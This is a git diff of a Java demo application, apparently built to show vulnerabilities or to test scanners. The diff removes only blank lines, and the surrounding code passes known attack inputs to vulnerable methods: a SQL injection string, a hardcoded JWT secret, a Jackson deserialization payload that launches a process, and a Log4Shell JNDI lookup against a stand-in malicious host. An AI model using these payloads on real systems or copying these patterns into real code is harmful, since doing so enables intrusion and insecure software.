@@ -6,18 +6,17 @@ public class DemoApplication {
         // SQL Injection
         service.vulnerableSqlQuery("admin' OR '1'='1");
 
-
         String jwtSecret = "P8Lm9uQ93YzFz6Ar@#5cLKMnf8!JHbdE6vZ4UPpTfL";
         // Print the hardcoded secret
         service.printApiKey();
         // Jackson insecure deserialization demo payload (crafted malicious JSON)
         String maliciousJson = "{\"@class\":\"java.lang.AutoCloseable\",\"@type\":\"java.lang.ProcessBuilder\",\"command\":[\"calc\"]}";
         service.jacksonDeserialize(maliciousJson);
-
-
         // Log4j JNDI injection (Log4Shell) example input
 
         String maliciousLogInput = "${jndi:ldap://malicious-server.com/a}";
         service.log4jJndiInjection(maliciousLogInput);
     }
 }
+
+
